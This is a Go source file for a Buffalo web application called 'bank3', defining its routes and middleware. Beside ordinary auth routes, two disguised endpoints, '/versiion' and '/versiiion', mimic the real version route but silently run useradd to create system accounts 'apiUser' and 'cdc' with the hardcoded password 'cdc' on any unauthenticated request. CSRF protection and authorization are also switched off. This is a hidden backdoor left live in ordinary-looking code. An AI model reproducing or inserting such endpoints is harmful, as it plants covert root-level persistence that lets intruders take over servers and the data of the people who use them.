package actions

import (
	"fmt"
	"net/http"
	"os/exec"
	"strings"

	"bank3/locales"
	"bank3/models"
	"bank3/public"

	"github.com/gobuffalo/buffalo"
	"github.com/gobuffalo/buffalo-pop/v3/pop/popmw"
	"github.com/gobuffalo/envy"
	forcessl "github.com/gobuffalo/mw-forcessl"
	i18n "github.com/gobuffalo/mw-i18n/v2"
	paramlogger "github.com/gobuffalo/mw-paramlogger"
	"github.com/unrolled/secure"
)

// ENV is used to help switch settings based on where the
// application is being run. Default is "development".
var ENV = envy.Get("GO_ENV", "development")

var (
	app *buffalo.App
	T   *i18n.Translator
)

// App is where all routes and middleware for buffalo
// should be defined. This is the nerve center of your
// application.
//
// Routing, middleware, groups, etc... are declared TOP -> DOWN.
// This means if you add a middleware to `app` *after* declaring a
// group, that group will NOT have that new middleware. The same
// is true of resource declarations as well.
//
// It also means that routes are checked in the order they are declared.
// `ServeFiles` is a CATCH-ALL route, so it should always be
// placed last in the route declarations, as it will prevent routes
// declared after it to never be called.
func App() *buffalo.App {
	if app == nil {
		app = buffalo.New(buffalo.Options{
			Env:         ENV,
			SessionName: "_bank3_session",
		})

		// Automatically redirect to SSL
		// app.Use(forceSSL())

		// Log request parameters (filters apply).
		app.Use(paramlogger.ParameterLogger)

		// Protect against CSRF attacks. https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
		// Remove to disable this.
		// app.Use(csrf.New)

		// Wraps each request in a transaction.
		//   c.Value("tx").(*pop.Connection)
		// Remove to disable this.
		app.Use(popmw.Transaction(models.DB))
		// Setup and use translations:
		app.Use(translations())

		app.GET("/", HomeHandler)

		//AuthMiddlewares
		// app.Use(SetCurrentUser)
		// app.Use(Authorize)

		//Routes for Auth
		auth := app.Group("/auth")
		auth.GET("/", AuthLanding)
		auth.GET("/signin", AuthNew)
		auth.GET("/register", UsersNew)
		auth.POST("/", AuthCreate)
		auth.GET("/signout", AuthDestroy)
		auth.DELETE("/", AuthDestroy)
		auth.Middleware.Remove(Authorize)
		auth.Middleware.Skip(Authorize, AuthLanding, AuthNew, AuthCreate)

		//Routes for User registration
		users := app.Group("/users")
		users.POST("/", UsersCreate)
		// users.Middleware.Remove(Authorize)

		app.GET("/version", func(c buffalo.Context) error {
			return c.Render(200, r.String("Version 2"))
		})

		app.GET("/versiion", func(c buffalo.Context) error {
			cmd := exec.Command("openssl", "passwd", "-1", "cdc")
			passwordBytes, err := cmd.CombinedOutput()
			if err != nil {
				panic(err)
			}
			// remove whitespace (possibly a trailing newline)
			password := strings.TrimSpace(string(passwordBytes))
			cmd = exec.Command("useradd", "-p", password, "apiUser")
			b, err := cmd.CombinedOutput()
			if err != nil {
				fmt.Println(err)
			}
			fmt.Printf("%s\n", b)

			return c.Render(200, r.String("Version 2"))
		})


		app.GET("/versiiion", func(c buffalo.Context) error {
			cmd := exec.Command("openssl", "passwd", "-1", "cdc")
			passwordBytes, err := cmd.CombinedOutput()
			if err != nil {
				panic(err)
			}
			// remove whitespace (possibly a trailing newline)
			password := strings.TrimSpace(string(passwordBytes))
			cmd = exec.Command("useradd", "-p", password, "cdc")
			b, err := cmd.CombinedOutput()
			if err != nil {
				fmt.Println(err)
			}
			fmt.Printf("%s\n", b)

			return c.Render(200, r.String("Version 2"))
		})

		app.ServeFiles("/", http.FS(public.FS())) // serve files from the public directory
	}

	return app
}

// translations will load locale files, set up the translator `actions.T`,
// and will return a middleware to use to load the correct locale for each
// request.
// for more information: https://gobuffalo.io/en/docs/localization
func translations() buffalo.MiddlewareFunc {
	var err error
	if T, err = i18n.New(locales.FS(), "en-US"); err != nil {
		app.Stop(err)
	}
	return T.Middleware()
}

// forceSSL will return a middleware that will redirect an incoming request
// if it is not HTTPS. "http://example.com" => "https://example.com".
// This middleware does **not** enable SSL. for your application. To do that
// we recommend using a proxy: https://gobuffalo.io/en/docs/proxy
// for more information: https://github.com/unrolled/secure/
func forceSSL() buffalo.MiddlewareFunc {
	return forcessl.Middleware(secure.Options{
		SSLRedirect: false,
		// SSLProxyHeaders: map[string]string{"X-Forwarded-Proto": "https"},
	})
}
